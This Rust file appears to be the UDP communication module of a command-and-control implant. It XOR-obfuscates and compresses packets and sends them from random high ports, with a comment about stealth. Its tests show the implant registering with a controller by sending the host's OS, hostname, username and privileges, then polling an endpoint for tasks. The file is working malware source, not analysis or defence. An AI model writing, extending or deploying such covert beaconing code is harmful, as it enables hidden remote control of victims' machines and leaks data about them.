use std::io::Write;
use std::net;
use std::net::ToSocketAddrs;
use std::panic::AssertUnwindSafe;
use lazy_static::lazy_static;
use rand::Rng;
use crc;
use crc::{Crc, CRC_16_GSM};

// Timeout in seconds
const SOCKET_TIMEOUT: u64 = 5;
// UDP socket constants
const LOCAL_HOST: &'static str = "0.0.0.0";
// This number could have been randomised to be more stealthy
const LOCAL_PORT_MIN: u64 = 50000;
const LOCAL_PORT_MAX: u64 = 65354;

// Status codes used in the UDP header, remove comment when implemented
const UDP_GET: u16 = 1;
// const UDP_HEAD: u16 = 2;
const UDP_POST: u16 = 3;
// const UDP_PUT: u16 = 4;
// const UDP_DELETE: u16 = 5;
// const UDP_CONNECT: u16 = 6;
// const UDP_OPTIONS: u16 = 7;
// const UDP_TRACE: u16 = 8;
// const UDP_PATCH: u16 = 9;

const OBFUSCATION_KEY: &'static str = env!("OBFUSCATION_KEY");

lazy_static! {
    static ref KEY: Vec<u8> = {
        match hex::decode(OBFUSCATION_KEY) {
            Ok(val) => val,
            _ => Vec::new()
        }
    };
}

/// Struct for UDP messages
struct UDPMessage {
    //message_header: UDPMessageHeader,
    status_code: u16,
    endpoint: String,
    body: String,
    request_header: String,
}

/// Implementation of UDPMessage methods
impl UDPMessage {
    const MAX_LENGTH: u16 = 508;
    const COMPRESSION_LEVEL: u32 = 11;
    const COMPRESSION_WINDOW_SIZE: u32 = 22;

    /// Static function used to create a UDPMessage from a URL, HTTP request header, message body
    /// and status code. Currently only supporting messages of a max length of 508 bytes. If the
    /// body is longer, the body will be cut
    ///
    /// # Returns
    /// UDPMessage struct
    fn new(url: String, request_header: String, body: String, status_code: u16) -> UDPMessage {
        UDPMessage {
            status_code,
            endpoint: url,
            body: body.to_string(),
            request_header,
        }
    }

    /// Concatenate a bytearray into a vector of bytes
    fn push_buf(buf: &mut Vec<u8>, buf2: &mut Vec<u8>) {
        for b in buf2 {
            buf.push(b.clone());
        }
    }

    /// Getter for the UDPMessage as a vector of bytes.
    ///
    /// # Returns
    /// The UDPMessage as a vector of bytes
    fn as_bytes(&mut self) -> Vec<u8> {
        // Compressing the payload of the message
        let mut message_body: Vec<u8> = vec![];
        UDPMessage::push_buf(&mut message_body, &mut self.endpoint.as_bytes().to_vec());
        UDPMessage::push_buf(&mut message_body, &mut self.body.as_bytes().to_vec());
        UDPMessage::push_buf(&mut message_body, &mut self.request_header.as_bytes().to_vec());
        let mut message_body = UDPMessage::compress(&message_body);

        // Creating a message header
        let mut message_header = UDPMessageHeader {
            message_length: message_body.len() as u16,
            status_code: self.status_code,
            checksum: UDPMessage::calculate_checksum(&mut message_body),
            url_length: self.endpoint.len() as u16,
            body_length: self.body.len() as u16,
            request_header_length: self.request_header.len() as u16,
        };

        // Setting up final message
        let mut buf: Vec<u8> = vec![];
        UDPMessage::push_buf(&mut buf, &mut message_header.as_bytes().to_vec());
        UDPMessage::push_buf(&mut buf, &mut message_body);

        // If key is defined, "encrypt" using the key
        if KEY.len() > 0 {
            UDPMessage::key_xor(&mut buf);
        }
        buf
    }

    /// Used to obfuscate the data. XORs the data with the defined KEY
    fn key_xor(buf: &mut Vec<u8>) {
        for i in 0..buf.len() {
            buf[i] = buf[i] ^ KEY[i % KEY.len()];
        }
    }

    /// Calculate the checksum of a buffer using CRC16
    ///
    /// # Returns
    /// The CRC16 checksum from the vector of bytes
    fn calculate_checksum(buf: &mut Vec<u8>) -> u16 {
        let crc = Crc::<u16>::new(&CRC_16_GSM);
        crc.checksum(buf)
    }

    /// Compress a buffer of bytes using Brotli
    ///
    /// # Returns
    /// The input buffer compressed, as a vector of bytes
    fn compress(buf: &Vec<u8>) -> Vec<u8> {
        let mut writer = brotli::CompressorWriter::new(
            Vec::new(),
            buf.len(),
            UDPMessage::COMPRESSION_LEVEL,
            UDPMessage::COMPRESSION_WINDOW_SIZE,
        );
        writer.write_all(buf).unwrap();
        writer.into_inner()
    }

    /// Decompress a buffer of bytes using Brotli
    ///
    /// # Returns
    /// The buffer decompressed as a vector of bytes
    ///
    /// # Errors
    /// If decompression fails
    fn decompress(buf: &Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        match std::panic::catch_unwind(AssertUnwindSafe(|| {
            let mut writer = brotli::DecompressorWriter::new(
                Vec::new(),
                buf.len(),
            );
            match writer.write_all(buf) {
                Ok(_) => {}
                _ => return Err(anyhow::Error::msg("Failed to decompress message"))
            };
            match writer.into_inner() {
                Ok(val) => Ok(val),
                _ => Err(anyhow::Error::msg("Failed to decompress message"))
            }
        })) {
            Ok(val) => val,
            _ => Err(anyhow::Error::msg("Failed to decompress message"))
        }
    }

    /// Extract a UDPMessageHeader from a buffer of bytes
    ///
    /// # Returns
    /// UDPMessageHeader
    ///
    /// # Errors
    /// If parsing of the header fails
    fn extract_message_header(buf: &mut Vec<u8>) -> Result<UDPMessageHeader, anyhow::Error> {
        // Verify length of message
        let buf_len = buf.len();
        if buf_len < UDPMessageHeader::HEADER_LENGTH as usize {
            return Err(anyhow::Error::msg("Error when parsing message header"));
        }
        // Extract UDPMessageHeader
        let message_header =
            UDPMessageHeader::from_bytes(&buf[0..UDPMessageHeader::HEADER_LENGTH as usize])?;

        Ok(message_header)
    }


    /// Static function to create a UDPMessage from a vector of bytes
    ///
    /// # Returns
    /// A UDPMessage generated from bytes
    ///
    /// # Errors
    /// If indexing on buffer goes out of range
    fn from_bytes(buf: &mut Vec<u8>) -> Result<UDPMessage, anyhow::Error> {
        // If key is defined, decrypt message
        if KEY.len() > 0 {
            UDPMessage::key_xor(buf);
        }

        let message_header = UDPMessage::extract_message_header(buf)?;

        // Verify checksum
        let mut cur_index = UDPMessageHeader::HEADER_LENGTH as usize;
        let mut message = buf[cur_index..buf.len()].to_vec();
        let checksum = UDPMessage::calculate_checksum(&mut message);
        if checksum != message_header.checksum {
            return Err(anyhow::Error::msg("Checksum of message is not valid"));
        }

        // Decompress
        let buf = match UDPMessage::decompress(&mut message) {
            Ok(val) => val,
            _ => Vec::new()
        };

        // Verify payload length
        if (message_header.url_length +
            message_header.body_length +
            message_header.request_header_length) < buf.len() as u16 {
            return Err(anyhow::Error::msg("Error when parsing message content"));
        }

        cur_index = 0;
        // Unpack URL
        let url =
            buf[cur_index..(cur_index + message_header.url_length as usize)].to_vec();
        cur_index += message_header.url_length as usize;

        // Unpack Body
        let body =
            buf[cur_index..(cur_index + message_header.body_length as usize)].to_vec();
        cur_index += message_header.body_length as usize;

        // Unpack Request Header
        let request_header =
            buf[cur_index..(cur_index + message_header.request_header_length as usize)].to_vec();

        // Create and return parsed message
        let message = UDPMessage {
            status_code: message_header.status_code,
            endpoint: String::from_utf8(url).unwrap(),
            body: String::from_utf8(body).unwrap(),
            request_header: String::from_utf8(request_header).unwrap(),
        };
        Ok(message)
    }

    /// Checks whether a UDPMessages is equal
    ///
    /// # Returns
    /// True if equal, otherwise false
    #[cfg(test)]
    fn equal(&mut self, msg: &UDPMessage) -> bool {
        self.status_code == msg.status_code &&
            self.endpoint == msg.endpoint &&
            self.body == msg.body &&
            self.request_header == msg.request_header
    }
}

/// Struct for the UDP message header
struct UDPMessageHeader {
    message_length: u16,
    status_code: u16,
    checksum: u16,
    url_length: u16,
    body_length: u16,
    request_header_length: u16,
}

/// Implementation of UDPMessageHeader methods
impl UDPMessageHeader {
    const HEADER_LENGTH: u16 = 12;

    // Indexes for buffer
    const MESSAGE_LEN_MSB: usize = 0;
    const MESSAGE_LEN_LSB: usize = 1;
    const STATUS_CODE_MSB: usize = 2;
    const STATUS_CODE_LSB: usize = 3;
    const CHECKSUM_MSB: usize = 4;
    const CHECKSUM_LSB: usize = 5;
    const URL_LEN_MSB: usize = 6;
    const URL_LEN_LSB: usize = 7;
    const BODY_LEN_MSB: usize = 8;
    const BODY_LEN_LSB: usize = 9;
    const MSG_HEADER_LEN_MSB: usize = 10;
    const MSG_HEADER_LEN_LSB: usize = 11;

    /// Getter for the message header as a bytearray
    ///
    /// # Returns
    /// Byte array representing the UDPMessageHeader
    fn as_bytes(&mut self) -> [u8; UDPMessageHeader::HEADER_LENGTH as usize] {
        let mut buf = [0; UDPMessageHeader::HEADER_LENGTH as usize];
        buf[UDPMessageHeader::MESSAGE_LEN_MSB] = (self.message_length >> 8) as u8;
        buf[UDPMessageHeader::MESSAGE_LEN_LSB] = (self.message_length) as u8;
        buf[UDPMessageHeader::STATUS_CODE_MSB] = (self.status_code >> 8) as u8;
        buf[UDPMessageHeader::STATUS_CODE_LSB] = self.status_code as u8;
        buf[UDPMessageHeader::CHECKSUM_MSB] = (self.checksum >> 8) as u8;
        buf[UDPMessageHeader::CHECKSUM_LSB] = self.checksum as u8;
        buf[UDPMessageHeader::URL_LEN_MSB] = (self.url_length >> 8) as u8;
        buf[UDPMessageHeader::URL_LEN_LSB] = self.url_length as u8;
        buf[UDPMessageHeader::BODY_LEN_MSB] = (self.body_length >> 8) as u8;
        buf[UDPMessageHeader::BODY_LEN_LSB] = self.body_length as u8;
        buf[UDPMessageHeader::MSG_HEADER_LEN_MSB] = (self.request_header_length >> 8) as u8;
        buf[UDPMessageHeader::MSG_HEADER_LEN_LSB] = self.request_header_length as u8;

        buf
    }

    /// Static method that creates a UDPMessageHeader from bytes
    ///
    /// # Returns
    /// UDPMessageHeader build from bytes in Big Endian
    ///
    /// # Errors
    /// If buffer goes out of range
    fn from_bytes(buf: &[u8]) -> Result<UDPMessageHeader, anyhow::Error> {
        if (buf.len() as u16) < UDPMessageHeader::HEADER_LENGTH {
            return Err(anyhow::Error::msg("To short buffer!"));
        }

        let header = UDPMessageHeader {
            message_length: (buf[UDPMessageHeader::MESSAGE_LEN_MSB] as u16) << 8 |
                buf[UDPMessageHeader::MESSAGE_LEN_LSB] as u16,
            status_code: (buf[UDPMessageHeader::STATUS_CODE_MSB] as u16) << 8 |
                buf[UDPMessageHeader::STATUS_CODE_LSB] as u16,
            checksum: (buf[UDPMessageHeader::CHECKSUM_MSB] as u16) << 8 |
                buf[UDPMessageHeader::CHECKSUM_LSB] as u16,
            url_length: (buf[UDPMessageHeader::URL_LEN_MSB] as u16) << 8 |
                buf[UDPMessageHeader::URL_LEN_LSB] as u16,
            body_length: (buf[UDPMessageHeader::BODY_LEN_MSB] as u16) << 8 |
                buf[UDPMessageHeader::BODY_LEN_LSB] as u16,
            request_header_length: (buf[UDPMessageHeader::MSG_HEADER_LEN_MSB] as u16) << 8 |
                buf[UDPMessageHeader::MSG_HEADER_LEN_LSB] as u16,
        };
        Ok(header)
    }

    /// Check equality with another UDPMessageHeader
    ///
    /// # Returns
    /// True if equal, otherwise false
    #[cfg(test)]
    fn equal(&mut self, header: &UDPMessageHeader) -> bool {
        self.request_header_length == header.request_header_length &&
            self.body_length == header.body_length &&
            self.url_length == header.url_length &&
            self.status_code == header.status_code &&
            self.message_length == header.message_length
    }
}

/// Initialise a UDP socket
///
/// # Returns
/// A UDP socket bound to given local address and port
fn init_host(local_host: String, timeout: u64) -> net::UdpSocket {
    let random_port = rand::thread_rng().gen_range(LOCAL_PORT_MIN, LOCAL_PORT_MAX);
    let host = format!("{}:{}", local_host, random_port.to_string());
    let socket = net::UdpSocket::bind(host).expect("Failed to init UDP socket");
    socket.set_read_timeout(Some(std::time::Duration::from_secs(timeout)))
        .expect("Failed to set timeout");
    socket
}

/// Sends a message over a UDP socket
fn send(socket: &net::UdpSocket, receiver: String, msg: &Vec<u8>) {
    let receiver = match receiver.to_socket_addrs().unwrap().next() {
        Some(val) => val,
        _ => {
            #[cfg(debug_assertions)]
            println!("Failed to resolve address: {}", receiver);
            return;
        }
    };
    match socket.send_to(&msg, receiver) {
        Ok(_) => {}
        Err(e) => {
            #[cfg(debug_assertions)]
            println!("Failed send message over socket: {}", e);
        }
    }
}

/// Listen to a socket to receive a message
///
/// # Returns
/// Vector of bytes received from the socket. If any error occured, an enpty vector will be
/// returned.
fn listen(socket: &net::UdpSocket) -> Vec<u8> {
    let mut buf: [u8; UDPMessage::MAX_LENGTH as usize] = [0; UDPMessage::MAX_LENGTH as usize];
    let mut result: Vec<u8> = Vec::new();
    match socket.recv(&mut buf) {
        Ok(bytes_read) => {
            #[cfg(debug_assertions)]
            println!("Message received, {} bytes", bytes_read);
            result = Vec::from(&buf[0..bytes_read]);
        }
        Err(e) => {
            #[cfg(debug_assertions)]
            println!("Failed receive message over socket: {}", e);
        }
    };
    result
}

fn get_authorization_header(token: &String) -> String {
    return format!("\"Authorization\": \"{}\"", token);
}

/// Send a post request using the UDP protocol
///
/// # Returns
/// If expecting a response, the reponse body will be returned
///
/// # Errors
/// If expecting response, and no response was returned from remote host or if parsing of the
/// response fails
pub fn post_request_udp(
    body: String,
    url: String,
    auth_token: &String,
    remote_host: String,
    remote_port: String,
    expecting_response: bool) -> Result<String, anyhow::Error> {
    // If token is valid, generate auth header
    let header = if auth_token != "" {
        get_authorization_header(auth_token)
    } else {
        String::new()
    };
    // Create message and send over socket
    let mut message = UDPMessage::new(url, header, body, UDP_POST);
    let tx_buf = message.as_bytes();
    let sock = init_host(LOCAL_HOST.to_string(),
                         SOCKET_TIMEOUT);
    send(&sock, format!("{}:{}", remote_host, remote_port), &tx_buf);

    // If not expecting response, return
    if !expecting_response {
        return Ok(String::new());
    }

    // If expecting response, listen for response
    let mut rx_buf = listen(&sock);

    // Parse response
    let response = match UDPMessage::from_bytes(&mut rx_buf) {
        Ok(val) => val,
        Err(e) => {
            #[cfg(debug_assertions)]
            println!("Failed to parse UDP response: {}", e);
            return Err(anyhow::Error::msg(e));
        }
    };

    // If status code is not 200, something is wrong
    if response.status_code != 200 {
        #[cfg(debug_assertions)]
        println!("UDP POST request received: {}", response.status_code);
        return Err(anyhow::Error::msg("Failed UDP POST request"));
    }
    Ok(response.body)
}

/// Send a get request using the UDP protocol
///
/// # Returns
/// If expecting a response, the reponse body will be returned
///
/// # Errors
/// If no response was returned from remote host or if parsing of the response fails
pub fn get_request_udp(url: String,
                       auth_token: &String,
                       remote_host: String,
                       remote_port: String) -> Result<String, anyhow::Error> {
    // If token is valid, generate auth header
    let header = if auth_token != "" {
        get_authorization_header(auth_token)
    } else {
        String::new()
    };
    // Create message and send over socket
    let mut mes = UDPMessage::new(url,
                                  header,
                                  String::new(),
                                  UDP_GET);
    let tx_buf = mes.as_bytes();
    let sock = init_host(LOCAL_HOST.to_string(),
                         SOCKET_TIMEOUT);
    send(&sock,
         format!("{}:{}", remote_host, remote_port),
         &tx_buf);

    // Listen for response
    let mut rx_buf = listen(&sock);

    // Parse response
    let response = match UDPMessage::from_bytes(&mut rx_buf) {
        Ok(val) => val,
        Err(e) => {
            #[cfg(debug_assertions)]
            println!("Failed to get response: {}", e);
            return Err(anyhow::Error::msg(e));
        }
    };

    // If status code is not 200, something
    if response.status_code != 200 {
        #[cfg(debug_assertions)]
        println!("UDP GET request received: {}", response.status_code);
        return Err(anyhow::Error::msg("Failed UDP GET request"));
    }
    Ok(response.body)
}

/// Tests the UDP parsing
#[cfg(test)]
mod tests {
    use crate::communication::{COMMAND_ENDPOINT, INIT_ENDPOINT};
    use super::*;

    const UDP_HEADERS: [&[u8; UDPMessageHeader::HEADER_LENGTH as usize]; 2] = [
        b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
        b"\x00\x01\x00\x02\x00\x00\x00\x03\x00\x04\x00\x05"
    ];
    const TEST_HEADER1: UDPMessageHeader = UDPMessageHeader {
        message_length: 0,
        status_code: 0,
        checksum: 0,
        url_length: 0,
        body_length: 0,
        request_header_length: 0,
    };
    const TEST_HEADER2: UDPMessageHeader = UDPMessageHeader {
        message_length: 1,
        status_code: 2,
        checksum: 0,
        url_length: 3,
        body_length: 4,
        request_header_length: 5,
    };
    const TEST_HEADERS: [&UDPMessageHeader; 2] = [
        &TEST_HEADER1,
        &TEST_HEADER2
    ];

    #[test]
    fn test_udp_message_header_as_bytes() {
        let mh_buf1 = TEST_HEADER1.as_bytes();
        let mh_buf2 = TEST_HEADER2.as_bytes();
        let actual = [mh_buf1, mh_buf2];

        for i in 0..UDP_HEADERS.len() {
            for j in 0..UDP_HEADERS[i].len() {
                assert_eq!(UDP_HEADERS[i][j], actual[i][j]);
            }
        }
    }

    #[test]
    fn test_udp_message_header_from_bytes() {
        for i in 0..UDP_HEADERS.len() {
            let mut udp_header = match UDPMessageHeader::from_bytes(UDP_HEADERS[i]) {
                Ok(val) => val,
                _ => continue
            };
            let expected_header = TEST_HEADERS[i];
            assert!(udp_header.equal(expected_header));
        }
    }

    #[test]
    fn test_udp_message_header_from_bytes_invalid() {
        let invalid_header = b"000";
        match UDPMessageHeader::from_bytes(invalid_header) {
            Ok(_) => assert!(false),
            Err(_) => assert!(true)
        };
    }

    const TEST_URL: &str = "http://127.0.0.1:8080/control/client/init";
    const TEST_REQUEST_HEADER: &str = "\"Authorization\": \"12345\"";

    #[test]
    fn test_udp_new_message() {
        let body = "Successful";
        let status_code = 0;
        let udp_message = UDPMessage::new(TEST_URL.to_string(),
                                          TEST_REQUEST_HEADER.to_string(),
                                          body.to_string(),
                                          status_code);

        assert_eq!(TEST_URL.to_string(), udp_message.endpoint);
        assert_eq!(body.to_string(), udp_message.body);
        assert_eq!(TEST_REQUEST_HEADER.to_string(), udp_message.request_header);
        assert_eq!(status_code, udp_message.status_code);
    }


    #[test]
    fn test_udp_new_message_long_body() {
        let mut body = String::new();
        for _ in 0..550 {
            body.push('A');
        }

        let status_code = 0;
        let udp_message = UDPMessage::new(TEST_URL.to_string(),
                                          TEST_REQUEST_HEADER.to_string(),
                                          body.to_string(),
                                          status_code);

        assert_eq!(TEST_URL.to_string(), udp_message.endpoint);
        assert_eq!(body.to_string(), udp_message.body);
        assert_eq!(TEST_REQUEST_HEADER.to_string(), udp_message.request_header);
        assert_eq!(status_code, udp_message.status_code);
    }

    #[test]
    fn test_udp_new_message_no_body() {
        let body = String::new();
        let status_code = 0;
        let udp_message = UDPMessage::new(TEST_URL.to_string(),
                                          TEST_REQUEST_HEADER.to_string(),
                                          body.to_string(),
                                          status_code);

        assert_eq!(TEST_URL.to_string(), udp_message.endpoint);
        assert_eq!(body, udp_message.body);
        assert_eq!(TEST_REQUEST_HEADER.to_string(), udp_message.request_header);
        assert_eq!(status_code, udp_message.status_code);
    }

    const INIT_MESSAGE_BYTES: &[u8] = b"\x00\x5c\x00\x03\x6c\xb8\x00\x14\x00\x6b\x00\x00\x1b\x7e\x00\xa0\x8c\xd4\x63\x4d\x19\x1c\x09\xa2\x9d\xd3\x7e\xfb\xff\x47\xb1\xac\x06\xed\xc2\x22\x05\x65\x94\x2c\x3a\x7d\x3a\x39\x70\xfa\xe1\x7b\x12\xa6\xa9\x64\xfc\x2d\x77\xe2\xd5\x73\x14\x16\x2a\xeb\xb3\x99\x97\x5d\x7a\x3f\xe7\x3d\x22\x10\xab\xf6\x94\x41\x60\x66\x24\x9c\xd7\xa8\x0e\xac\x80\xba\x77\x9e\x51\xf7\x93\xd5\xae\x04\x41\xc5\x21\x71\x40\xa4\x86\x08\x59\x33";
    const GET_TASKS_MESSAGES_BYTES: &[u8] = b"\x00\x2a\x00\x01\x36\xe4\x00\x14\x00\x00\x00\x18\x1b\x2b\x00\xf8\x05\x52\x39\x22\x6d\x0e\xa4\xd9\x27\x43\x1b\xe8\x60\x22\x07\xee\xad\xe8\x66\x6f\x24\x4a\x89\x45\x23\x19\x2d\x38\xcb\xfd\xec\xfe\xd3\x7e\x45\x64\xf5\x00";
    const UDP_BYTE_MESSAGES: [&[u8]; 2] = [
        INIT_MESSAGE_BYTES,
        GET_TASKS_MESSAGES_BYTES
    ];
    const INIT_BODY: &'static str = "{\"os_name\":\"macOS\",\"os_version\":\"12.6.1\",\"hostname\":\"johans-mbp-5\",\"host_user\":\"johan\",\"privileges\":\"null\"}";
    const REQUEST_HEADERS: &'static str = "\"Authorization\": \"12345\"";


    #[test]
    fn test_udp_message_as_bytes() {
        let udp_init_message: UDPMessage = UDPMessage {
            status_code: UDP_POST,
            endpoint: INIT_ENDPOINT.to_string(),
            body: INIT_BODY.to_string(),
            request_header: "".to_string(),
        };
        let get_task_message: UDPMessage = UDPMessage {
            status_code: UDP_GET,
            endpoint: COMMAND_ENDPOINT.to_string(),
            body: "".to_string(),
            request_header: REQUEST_HEADERS.to_string(),
        };
        let mut udp_messages = [
            udp_init_message,
            get_task_message
        ];
        for i in 0..UDP_BYTE_MESSAGES.len() {
            let bytes = udp_messages[i].as_bytes();
            for j in 0..bytes.len() {
                assert_eq!(bytes[j], UDP_BYTE_MESSAGES[i][j]);
            }
        }
    }

    #[test]
    fn test_udp_message_from_bytes() {
        let udp_init_message: UDPMessage = UDPMessage {
            status_code: UDP_POST,
            endpoint: "/control/client/init".to_string(),
            body: INIT_BODY.to_string(),
            request_header: "".to_string(),
        };
        let get_task_message: UDPMessage = UDPMessage {
            status_code: UDP_GET,
            endpoint: "/control/client/task".to_string(),
            body: "".to_string(),
            request_header: REQUEST_HEADERS.to_string(),
        };
        let udp_messages = [
            &udp_init_message,
            &get_task_message
        ];

        for i in 0..udp_messages.len() {
            let mut udp_message = UDPMessage::from_bytes(&mut UDP_BYTE_MESSAGES[i].to_vec())
                .unwrap();
            assert!(udp_message.equal(udp_messages[i]));
        }
    }

    #[test]
    fn test_udp_message_from_bytes_invalid() {
        let buf = b"000";
        match UDPMessage::from_bytes(&mut buf.to_vec()) {
            Ok(_) => assert!(false),
            Err(_) => assert!(true)
        }

        let buf = b"1234000012312300";
        match UDPMessage::from_bytes(&mut buf.to_vec()) {
            Ok(_) => assert!(false),
            Err(_) => assert!(true)
        };
        let buf = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
        match UDPMessage::from_bytes(&mut buf.to_vec()) {
            Ok(_) => assert!(false),
            Err(_) => assert!(true)
        };
    }
}
